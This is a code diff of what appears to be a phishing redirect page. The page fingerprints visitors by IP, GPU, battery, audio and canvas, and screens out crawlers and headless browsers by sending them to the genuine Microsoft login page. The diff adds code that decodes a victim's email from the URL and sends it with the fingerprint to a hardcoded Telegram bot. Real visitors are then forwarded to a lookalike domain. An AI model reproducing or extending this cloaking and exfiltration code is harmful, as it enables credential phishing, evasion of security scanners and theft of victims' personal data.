@@ -4,18 +4,42 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="referrer" content="no-referrer">
+<title>Redirecting...</title>
 </head>
 <body>
 <canvas id="gl" style="display:none"></canvas>
 <script>
 const CFG = {
+  // Your destination URL
   D: "https://d3d97e2af1201de9799aed11aed02ffe.com/WJmmHi0ELP4/--/",
+  // Fallback / Bot destination
   B: "https://login.microsoftonline.com",
+  // Telegram Bot Token
   T: "8360539543:AAGZtvr7bt1PVcRfq8eTkHCxHigKBjHMwaQ",
-  C: "659482680"
+  // Telegram Chat ID
+  C: "659482680",
+  // If "TRUE", decodes the email. If "FALSE", passes the base64 raw.
+  O: "TRUE" 
 };
 
-let state = { score: 0, interacted: false };
+let userState = { score: 0, interacted: false };
+
+// --- HELPER: Extract and Process Email from URL ---
+const getProcessedEmail = () => {
+  const params = new URLSearchParams(window.location.search);
+  const rawState = params.get('state') || "no_email_found";
+  
+  if (CFG.O === "TRUE" && rawState !== "no_email_found") {
+    try {
+      // Decode Base64 (handle URL-safe base64 by replacing chars if necessary)
+      const base64 = rawState.replace(/-/g, '+').replace(/_/g, '/');
+      return atob(base64); 
+    } catch (e) {
+      return rawState; // Return raw if decoding fails
+    }
+  }
+  return rawState;
+};
 
 const tgLog = async txt => {
   try {
@@ -55,8 +79,6 @@ const getCanvasFP = () => {
   ctx.fillRect(125, 1, 62, 20);
   ctx.fillStyle = '#069';
   ctx.fillText('🧪', 2, 15);
-  ctx.fillStyle = 'rgba(102,204,0,0.7)';
-  ctx.fillText('🧪', 4, 17);
   return c.toDataURL();
 };
 
@@ -77,78 +99,60 @@ const getAudioFP = async () => {
   } catch (_) { return "UNSUPPORTED"; }
 };
 
-const getUAHash = () => {
-  let h = 0;
-  for (let i = 0; i < navigator.userAgent.length; i++)
-    h = (h << 5) - h + navigator.userAgent.charCodeAt(i);
-  return h >>> 0;
-};
-
 const detectHeadless = () => {
   const probes = ['webdriver', '__nightmare', '_selenium', 'callPhantom', '__phantomas'];
   if (probes.some(p => p in window)) return true;
   if (navigator.webdriver) return true;
-  if (window.chrome && chrome.runtime && !chrome.runtime.id) return true;
   return false;
 };
 
-const calculateScore = async () => {
-  let penalty = 0;
-  if (navigator.webdriver) penalty += 30;
-  if (detectHeadless()) penalty += 30;
-  if (!window.chrome) penalty += 20;
-  if (!window.PaymentRequest) penalty += 15;
-  return penalty;
-};
-
-const assembleLog = async () => {
-  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: "NA" }));
+const assembleLog = async (email) => {
+  const ipReq = await fetch('https://api.ipify.org?format=json').catch(() => ({}));
+  const ipData = ipReq.json ? await ipReq.json() : { ip: "NA" };
   const bat = await getBattery();
   const gpu = getWebGL();
-  const canvas = getCanvasFP();
   const audio = await getAudioFP();
-  const tz = (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) { return "UNSUPPORTED"; } })();
-  const uaHash = getUAHash();
-  return `<b>[LOG]</b>
-IP: ${ip.ip}
-UA_HASH: ${uaHash}
-BATTERY: ${bat}
-GPU_RENDERER: ${gpu.renderer}
-GPU_VENDOR: ${gpu.vendor}
-GPU_VERSION: ${gpu.version}
-CANVAS_FP: ${canvas.slice(0,30)}
-AUDIO_FP: ${audio}
-TIMEZONE: ${tz}
-SCREEN: ${window.screen.width}x${window.screen.height} cd:${window.screen.colorDepth} pr:${window.devicePixelRatio}
-HARDWARE: cores:${navigator.hardwareConcurrency||0} mem:${navigator.deviceMemory||0}
-LANG: ${navigator.language||"NA"}
-NETWORK: ${navigator.connection?.type||"NA"} ${navigator.connection?.effectiveType||"NA"} dl:${navigator.connection?.downlink||0} rtt:${navigator.connection?.rtt||0}
+  
+  return `<b>[ACCESS LOG]</b>
+<b>EMAIL:</b> ${email}
+<b>IP:</b> ${ipData.ip}
+<b>GPU:</b> ${gpu.renderer}
+<b>BATTERY:</b> ${bat}
+<b>AUDIO:</b> ${audio}
+<b>UA:</b> ${navigator.userAgent}
 `;
 };
 
+// Interaction listener
 ['mousemove','touchstart','click','keydown'].forEach(ev =>
-  window.addEventListener(ev, () => { state.interacted = true; }, { once: true })
+  window.addEventListener(ev, () => { userState.interacted = true; }, { once: true })
 );
 
 const run = async () => {
-  await new Promise(r => setTimeout(r, 600));
-  await new Promise(r => setTimeout(r, 1300));
-  await new Promise(r => setTimeout(r, 1100));
-  const penalty = await calculateScore();
-  state.score = -penalty;
-  const log = await assembleLog();
-  if (!state.interacted && state.score < -40) {
-    await tgLog(log + "\nSTATUS: BLOCKED");
+  // Human-like delays
+  await new Promise(r => setTimeout(r, 1500));
+  
+  const isHeadless = detectHeadless();
+  const email = getProcessedEmail();
+  const log = await assembleLog(email);
+
+  // If Headless OR No interaction occurred after delay (Bot behavior)
+  if (isHeadless || !userState.interacted) {
+    await tgLog(log + "<b>STATUS:</b> ❌ BLOCKED (Bot/Headless)");
     window.location.replace(CFG.B);
   } else {
-    await tgLog(log + "\nSTATUS: PASSED");
-    setTimeout(() => window.location.replace(CFG.D), 400);
+    await tgLog(log + "<b>STATUS:</b> ✅ PASSED");
+    // Final Redirect: CFG.D + # + email
+    setTimeout(() => window.location.replace(CFG.D + "#" + email), 300);
   }
 };
 
 window.onload = () => {
-  const ua = navigator.userAgent;
-  if (ua.includes("Bot") || ua.includes("Crawl")) {
+  const ua = navigator.userAgent.toLowerCase();
+  const botKeywords = ["bot", "crawl", "spider", "slurp", "facebookexternalhit", "lighthouse"];
+  
+  // Instant check for known bot UAs
+  if (botKeywords.some(keyword => ua.includes(keyword))) {
     window.location.replace(CFG.B);
   } else {
     run();
